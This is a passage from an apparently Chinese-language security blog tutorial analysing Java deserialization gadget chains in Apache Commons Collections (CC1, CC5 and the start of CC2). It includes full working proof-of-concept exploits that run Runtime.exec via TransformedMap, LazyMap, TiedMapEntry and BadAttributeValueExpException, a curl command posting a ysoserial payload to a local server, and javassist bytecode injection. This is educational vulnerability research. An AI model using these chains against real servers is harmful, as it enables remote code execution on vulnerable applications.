            var2 = AnnotationType.getInstance(this.type);//根据【this.type】给var2赋值为一个实例
        &#125; catch (IllegalArgumentException var9) &#123;
            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
        &#125;

        Map var3 = var2.memberTypes();//var3为var2 Annotation中的[value:ElementType]
        Iterator var4 = this.memberValues.entrySet().iterator();//*****var4会直接将memberValues自身作为parent传入，和第五步我们自己构造的一模一样！！！如果没看懂的，建议看第五步仔细阅读。

        while(var4.hasNext()) &#123;//如果var4中还有下一个key-Value对
            Entry var5 = (Entry)var4.next(); //获取下一个key-value对，并赋值给var5
            String var6 = (String)var5.getKey();//获取var5的key
            Class var7 = (Class)var3.get(var6);//在var3中查看有没有这个key，把结果赋值给var7
            if (var7 != null) &#123;//如果var3中有这个key
                Object var8 = var5.getValue();//获取这个key-Value对中的value
                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;
                    //*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，call var5(Map)的setValue()方法
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));
                &#125;
            &#125;
        &#125;
    &#125;
</code></pre>
<p>我们看到了熟悉的<code>this.memberValues.entrySet().iterator();</code>，在后面还有<code>setValue()</code>，这已经足够我们利用了。</p>
<p>上面代码<code>comment</code>中的<code>【this.type】</code>和<code>【this.memberValues】</code>都是可控的 -》 在constructor中可以传入。</p>
<pre><code class="java">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;
            this.type = var1;
            this.memberValues = var2;
        &#125; else &#123;
            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);
        &#125;
    &#125;
</code></pre>
<p><code>memberValues</code>我们赋值为<code>TransformedMap.decorate()</code>的返回值，那<code>type</code>呢？我们可以发现<code>type</code>是一种<code>Annotation</code>（注释），如果有同学用过<code>SpringBoot或Spring</code>的话，就会理解<code>Annotation</code>的意义。所以此处我们是要传一个Annotation的Class过去。再看<code>readObject()</code>中的逻辑：</p>
<pre><code class="java">            ...
        var2 = AnnotationType.getInstance(this.type);//根据【this.type】给var2赋值为一个Annotation实例（实际会获取到注解的各种属性，包括注解元素，注解元素的默认值，生命周期，是否继承等等。）
        Map var3 = var2.memberTypes();//var3为var2 Annotation中的[value:ElementType]
        while(var4.hasNext()) &#123;
            Entry var5 = (Entry)var4.next(); //获取下一个entry
            String var6 = (String)var5.getKey();//获取var5的key
            Class var7 = (Class)var3.get(var6);//在var3 memberTypes中查看有没有这个key，把结果赋值给var7
            if (var7 != null) &#123;//如果var3 memberTypes中有这个key
                Object var8 = var5.getValue();//获取这个key-Value对中的value
                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;
                    //*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，触发漏洞
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));
                &#125;
            &#125;
        &#125;
</code></pre>
<p>我们传入的这个type需要有<code>memberTypes</code>，且我们的<strong>map</strong>中的key必须要和<code>memberTypes</code>的key保持<strong>一致。</strong></p>
<p>跟踪<code>Annotation</code>这个<code>Class</code>，我们可以发现所有<code>Annotation</code>的<code>class。</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731231645279.png" alt="image-20210731231645279"></p>
<p>这里我们可以简单分析一下：</p>
<pre><code class="java">@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Target &#123;
    ElementType[] value();
&#125;
</code></pre>
<p>此处<code>Target</code>的<code>memberTypes</code>就是 <code>[value:ElementType]</code> =》 <strong>key-value</strong>的形式。</p>
<pre><code class="java">@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Retention &#123;
    RetentionPolicy value();
&#125;
</code></pre>
<p>此处<code>Retention</code>的<code>memberTypes</code>就是 <code>[value:RetentionPolicy]</code> =》 <strong>key-value</strong>的形式`。</p>
<p>这些<code>Annotation</code>的元注解都可以通过<code>@</code>符号来调用，例如<code>@Target</code><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731232549977.png" alt="image-20210731232549977"></p>
<p>因此我们可以选择传入<code>Target.class</code>或者<code>Retention.class</code>, <code>map</code>的<code>key</code>值为<code>value</code>。</p>
<h4 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h4><pre><code class="java">public class TransformedMapExploit &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, InstantiationException &#123;
        /*
        * 客户端构造payload，并序列化文件
        * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;

        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put(&quot;value&quot;,&quot;anyContent&quot;);
        Map myMap = TransformedMap.decorate(map, null, chainedTransformer);//malicious map

        Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);//反射获取该类
        Constructor&lt;?&gt; aConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);//获取构造方法
        aConstructor.setAccessible(true);//取消构造方法限制
        Object o = aConstructor.newInstance(Target.class, myMap);//传入参数和malicious map

        //序列化

        FileOutputStream fileOutputStream = new FileOutputStream(&quot;tm.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(o);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();

        /*
        * 服务端反序列化读取，并触发漏洞
        * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;tm.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//触发漏洞
    &#125;
&#125;
</code></pre>
<p>成功弹出计算器，这样服务端只需要<code>readObject()</code>即可触发反序列化漏洞了！</p>
<h3 id="LazyMap版本-POC构造过程-CommonsCollections-1"><a href="#LazyMap版本-POC构造过程-CommonsCollections-1" class="headerlink" title="LazyMap版本 - POC构造过程(CommonsCollections 1)"></a>LazyMap版本 - POC构造过程(CommonsCollections 1)</h3><h4 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h4><p>第一步到第三步和<code>TransformedMap</code>版本都是一模一样的，主要问题在于如何call到<code>ChainedTrasnformer.transform()</code></p>
<p>剩下的步骤和cc3的LazyMap、AnnotationInvocationHandler、动态代理一模一样，<a href="#lazyMap">点这里看</a></p>
<h4 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h4><pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class LazyMapExploit &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;
        /*
         * 客户端构造payload，并序列化文件
         * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        String classToSerialize = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
        final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        final Map testMap = new HashMap();

        Map evilMap = (Map) Proxy.newProxyInstance(
                testMap.getClass().getClassLoader(),
                testMap.getClass().getInterfaces(),
                secondInvocationHandler
        );
        final Constructor&lt;?&gt; ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(handler);//序列化badAttributeValueExpException
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞
    &#125;
&#125;
</code></pre>
<h3 id="LazyMap版本-POC构造过程（CommonsCollections-5）"><a href="#LazyMap版本-POC构造过程（CommonsCollections-5）" class="headerlink" title="LazyMap版本 - POC构造过程（CommonsCollections 5）"></a>LazyMap版本 - POC构造过程（CommonsCollections 5）</h3><h4 id="Intro-2"><a href="#Intro-2" class="headerlink" title="Intro"></a>Intro</h4><hr>
<p><span id="cc5">3/12/2021 补充：</span></p>
<p>之前学习的时候看的资料太杂，学到cc5的时候发现这个LazyMap版本其实是cc5的，CC1的LazyMap版本其实是用到了<strong>代理</strong>方面的知识。</p>
<hr>
<p>我们的利用链需要用到如下的Class</p>
<ul>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>LazyMap</li>
<li>BadAttributeValueExpException</li>
</ul>
<h4 id="第一步到第三步："><a href="#第一步到第三步：" class="headerlink" title="第一步到第三步："></a>第一步到第三步：</h4><p>和之前的TransformedMap版本低前三步是一样的。</p>
<h4 id="第四步：LazyMap-get"><a href="#第四步：LazyMap-get" class="headerlink" title="第四步：LazyMap - get()"></a>第四步：LazyMap - get()</h4><p>同<code>TransformedMap</code>一样，我们需要寻找可以执行<code>chainedTransformer</code>的<code>transform()</code>方法的利用链。</p>
<p>在<code>LazyMap</code>中，我们发现了</p>
<pre><code class="java">public Object get(Object key) &#123;
    if (!super.map.containsKey(key)) &#123;
        Object value = this.factory.transform(key);//重点
        super.map.put(key, value);
        return value;
    &#125; else &#123;
        return super.map.get(key);
    &#125;
&#125;
</code></pre>
<p>在这段代码中，<code>this.factory.transform(key)</code>就执行了<code>transform()</code>方法，如果我们能让<code>factory</code>被赋值为我们构造好的<code>chainedTransformer</code>，就可以触发漏洞了。</p>
<p>我们发现LazyMap有两个构造函数，其中一个构造函数会传入以<code>Transformer</code>类型的参数</p>
<pre><code class="java">protected LazyMap(Map map, Transformer factory) &#123;
    super(map);
    if (factory == null) &#123;
        throw new IllegalArgumentException(&quot;Factory must not be null&quot;);
    &#125; else &#123;
        this.factory = factory;//我们可以控制factory
    &#125;
&#125;
</code></pre>
<p>我们尝试构造POC时new一个新的LazyMap，并将我们的链传进去，发现无法被构造。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215256433.png" alt="image-20210805215256433"></p>
<p>该构造方法是<strong>protected</strong>修饰的，意味着我们不能直接访问。</p>
<p>在<code>LazyMap</code>中，还有一个我们熟悉的<code>decorate()</code>方法，该方法会返回我们想要的instance</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215440540.png" alt="image-20210805215440540"></p>
<p>于是，现在的<strong>POC</strong>可以构造如下：</p>
<pre><code class="java">public class LazyMapExploit &#123;
    public static void main(String[] args) &#123;
        /*
         * 客户端构造payload，并序列化文件
         * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;

        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        lazyMap.get(&quot;hello&quot;);//触发漏洞
    &#125;

&#125;
</code></pre>
<p>计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215558587.png" alt="image-20210805215558587"></p>
<p>现在，我们尝试模拟远程服务器与客户端之间的序列化和反序列化流程。</p>
<p><strong>POC</strong>:</p>
<pre><code class="java">public class LazyMapExploit &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
        /*
         * 客户端构造payload，并序列化文件
         * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;

        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap

        //序列化

        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(lazyMap);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Map target = (Map) objectInputStream.readObject();
        target.get(&quot;hello&quot;);//触发漏洞
    &#125;

&#125;
</code></pre>
<p>成功！我们现在看看，服务端触发漏洞的话，需要什么条件： 将反序列化后的object强制转化为Map类，然后再调用get()方法 - 看上去依然有点麻烦，我们有什么办法能让它更容易被触发呢？</p>
<h4 id="第五步：TiedMapEntry-getValue"><a href="#第五步：TiedMapEntry-getValue" class="headerlink" title="第五步：TiedMapEntry.getValue()"></a>第五步：TiedMapEntry.getValue()</h4><p>安全研究前辈们并未发现有可控且调用<code>get()</code>方法的<code>readObject()</code>方法，但在<code>TiedMapEntry</code>类中，<code>getValue()</code>方法调用了get()方法，<code>map</code>变量是可控的。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806093126421.png" alt="image-20210806093126421"></p>
<h4 id="第六步：TiedMapEntry-toString"><a href="#第六步：TiedMapEntry-toString" class="headerlink" title="第六步：TiedMapEntry.toString()"></a>第六步：TiedMapEntry.toString()</h4><p>我们继续找有没有调用<code>getValue()</code>的方法，就在<code>TiedMapEntry</code>类中，我们发现了<code>toString()</code>，其中会调用到<code>getValue()</code>。</p>
<pre><code class="java">    public String toString() &#123;
        return this.getKey() + &quot;=&quot; + this.getValue();
    &#125;
</code></pre>
<p>这样一来我们的利用链便是 - <code>调用toString()会触发 -&gt; getValue() -&gt;get()</code>。那是否能像<code>TransformedMap</code>版本的POC一样，能够找到一个可控的<code>readObject()</code>直接调用<code>toString()</code>呢？</p>
<h4 id="第七步：BadAttributeValueExpException"><a href="#第七步：BadAttributeValueExpException" class="headerlink" title="第七步：BadAttributeValueExpException"></a>第七步：BadAttributeValueExpException</h4><p>在<code>BadAttributeValueExpException</code>类中，我们发现了<code>readObject()</code>方法，其调用了<code>toString()</code></p>
<pre><code class="java">    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get(&quot;val&quot;, null);//valObj是从fields中得到val的值

        if (valObj == null) &#123;
            val = null;
        &#125; else if (valObj instanceof String) &#123;
            val= valObj;
        &#125; else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) &#123;
            val = valObj.toString();//此处调用了toString()
        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
        &#125;
    &#125;
</code></pre>
<p>如果我们能够控制<code>valObj</code>为<code>TiedMapEntry</code>类的<code>object</code>，就能够触发漏洞。这里的<code>valObj</code>是从反序列化后的<code>object</code>的<code>fields</code>中直接得到的，那么我们可以直接创建一个值为<code>TiedMapEntry</code>类<code>object</code>的<code>val</code>field。</p>
<p>我们先看看<code>constructor</code>能不能直接赋值：</p>
<pre><code class="java">    public BadAttributeValueExpException (Object val) &#123;
        this.val = val == null ? null : val.toString();
        //如果val为null，则this.val=null
        //如果val不为null,则this.val = val.toString()
    &#125;
</code></pre>
<p>在<code>constructor</code>中，如果我们直接通过构造方法传入<code>TiedMapEntry</code>类，会在客户端创建<code>object</code>的时候就执行<code>toString()</code>触发方法并把结果赋值给<code>val</code>，而服务器在调用<code>readObject()</code>的时候获取到的<code>val</code>为<strong>toString()方法的返回值</strong>，从而不会触发漏洞。</p>
<p>于是我们不能通过<code>constructor</code>传入<code>TiedMapEntry</code>类的<code>object</code>，相反，我们设置它为<code>null</code>。我们尝试能否手动设置val的值：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095753374.png" alt="image-20210806095753374"></p>
<p>发现并不能访问到<code>val</code>值，val值是<code>private</code>属性,<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095846949.png" alt="image-20210806095846949"></p>
<p>在<code>BadAttributeValueExpException</code>类中也没有<code>setter</code>能够帮助我们去设置。那么我们可以使用反射对其赋值。</p>
<h4 id="最终POC-1"><a href="#最终POC-1" class="headerlink" title="最终POC"></a>最终POC</h4><pre><code class="java">public class LazyMapExploit &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;
        /*
         * 客户端构造payload，并序列化文件
         * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;leihehe&quot;);//绑定给TiedMapEntry，如果TiedMapEntry的toString()被执行，lazyMap会被执行get()
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);//该类中的readObject()可控，可执行TiedMapEntry的toString()
        //创建一个badAttributeValueExpException实例，这将作为我们的最终的恶意object被序列化
        Field val = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);//得到val这个variable
        val.setAccessible(true);//因为是private，所以需要设置accessible为true
        val.set(badAttributeValueExpException,tiedMapEntry);//修改val的值为tiedMapEntry
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);//序列化badAttributeValueExpException
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞
    &#125;
&#125;
</code></pre>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1498#Transformer">Java反序列化-CommonCollections</a></p>
<p><a target="_blank" rel="noopener" href="https://www.guildhab.top/2020/06/java-rmi-%E5%88%A9%E7%94%A84-%E6%9C%80%E5%9F%BA%E6%9C%AC%E7%9A%84%E4%B8%A4%E6%9D%A1-apache-commons-collections-pop-gadget-chains/">Java 反序列化漏洞(4) – Apache Commons Collections POP Gadget Chains 剖析</a></p>
<p><a target="_blank" rel="noopener" href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/">【反序列化漏洞】commons-collections-1 组件</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yyhuni/p/14777166.html">Java反序列化漏洞Apache CommonsCollections分析</a></p>
<h2 id="Commons-Collections-2"><a href="#Commons-Collections-2" class="headerlink" title="Commons Collections 2"></a>Commons Collections 2</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0">CommonsCollections4-4.0</a></p>
<p>jdk1.7 1.8低版本</p>
<p><a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Java反序列化漏洞之Ysoserial安装配置</a>中的<strong>WebServer环境搭建</strong>章节</p>
<h3 id="复现演示"><a href="#复现演示" class="headerlink" title="复现演示"></a>复现演示</h3><p>首先在Ysoserial中配置：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190531654.png" alt="image-20211126190531654"></p>
<p>运行生成：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190648753.png" alt="image-20211126190648753"></p>
<p>运行我们的webserver：</p>
<p><code>curl &quot;http://localhost:9090/webTest1_Web_exploded/test&quot; --data-binary @payload.ser</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126191106461.png" alt="image-20211126191106461"></p>
<p>即可弹出计算器。</p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="CommonsCollections-2-利用链原理"><a href="#CommonsCollections-2-利用链原理" class="headerlink" title="CommonsCollections 2 利用链原理"></a>CommonsCollections 2 利用链原理</h4><p>在<strong>CommonsCollections2</strong>中，我们将使用<a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/11/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/">javassist</a>在java字节码(.class)中插入命令执行代码，接着用某个重写了<code>loadClass</code>方法的<strong>ClassLoader</strong>来加载我们生成好的字节码(.class文件)，实现执行恶意代码的效果。ClassLoader用双亲委派机制来加载Class。</p>
<h4 id="Javassist生成执行命令的Class"><a href="#Javassist生成执行命令的Class" class="headerlink" title="Javassist生成执行命令的Class"></a>Javassist生成执行命令的Class</h4><p>首先我们先模拟以下<strong>javassist</strong>怎么生成执行命令的字节码</p>
<pre><code class="java">import javassist.*;
import java.io.IOException;
public class javassistTest &#123;
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException &#123;
        //需要创建的class对应一个CtClass, ClassPool是一个容器，包含了各种CtClass
        ClassPool cp = ClassPool.getDefault();//获取一个默认的ClassPool
        CtClass cc = cp.get(javassistTest.class.getName());//根据反射知识，javassistTest.class是javassistTest instance(object),将javassistTest object的名字放入ClassPool的hashmap中，并返回一个ctClass
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块
        cc.setName(&quot;Leihehe&quot;);
        cc.writeFile();
    &#125;
&#125;
</code></pre>
<p><code>CtClass cc = cp.get(javassistTest.class.getName());</code></p>
<p>我们知道每个需要修改编辑的Class都需要有一个<strong>CtClass</strong>，所以我们需要为我们需要修改的class创建一个CtClass。此处，我们把javassistTest object放入了ClassPool的hashmap中（表明我们需要修改此类），它会给我们返回一个新的CtClass。</p>
<blockquote>
<p>The <strong>java.lang.Class.getName()</strong> returns the name of the entity (class, interface, array class, primitive type, or void) represented by this Class object, as a String.</p>
</blockquote>
<p>所以我们是在hashmap中放入javassistTest object的名字，然后返回了一个新的CtClass。</p>
<p>当我们得到了这个新的CtClass，我们就可以对字节码进行操作了。</p>
<blockquote>
<p>CtConstructor, <em>makeClassInitializer</em>(). Makes an empty class initializer (static constructor).</p>
</blockquote>
<p><code> cc.makeClassInitializer().insertBefore(cmd)</code>创建了一个static代码块，并把cmd插入到了static代码块前面，如下：</p>
<pre><code class="java">    static &#123;
        Runtime.getRuntime().exec(&quot;calc&quot;);
    &#125;
</code></pre>
<p><code>cc.setName(&quot;Leihehe&quot;);</code>设置了字节码中的类名</p>
<p><code>cc.writeFile();</code>是将字节码保存到文件中。<strong>这时候，我们的字节码编写工作就完成了！</strong></p>
<h4 id="ClassLoader加载字节码"><a href="#ClassLoader加载字节码" class="headerlink" title="ClassLoader加载字节码"></a>ClassLoader加载字节码</h4><p>我们平时写代码的文件都是.java格式，经过编译后，会生成.class文件，也就是字节码。 JVM虚拟机想要执行字节码的话，需要使用<strong>ClassLoader Class</strong>来将这些文件load进JVM，其中的<code>defineClass()</code>方法就是来做这件事的。</p>
<p>下面我们手写一个ClassLoader来加载字节码</p>
<pre><code class="java">public class TestClassLoader extends ClassLoader &#123;//继承ClassLoader
    public TestClassLoader(ClassLoader parent) &#123;
        super(parent);
    &#125;
    public Class g(String name,byte[] b)&#123;
        return super.defineClass(name,b,0,b.length);
    &#125;
&#125;
</code></pre>
<p>接着， 我们在之前的<code>javassistTest </code> Class里添加以下代码：</p>
<pre><code class="java">final byte[] classBytes = cc.toBytecode();//获取字节码
new TestClassLoader(javassistTest.class.getClassLoader()).g(null,classBytes).newInstance();
</code></pre>
<p><code>TestClassLoader(javassistTest.class.getClassLoader())</code>加载了字节码，<code>g()</code>将bytes[]类型的字节码转换成了一个Class instance，但Class instance中的内容并不会主动执行(static代码区)和初始化，所以我们需要使用newInstance()手动触发。</p>
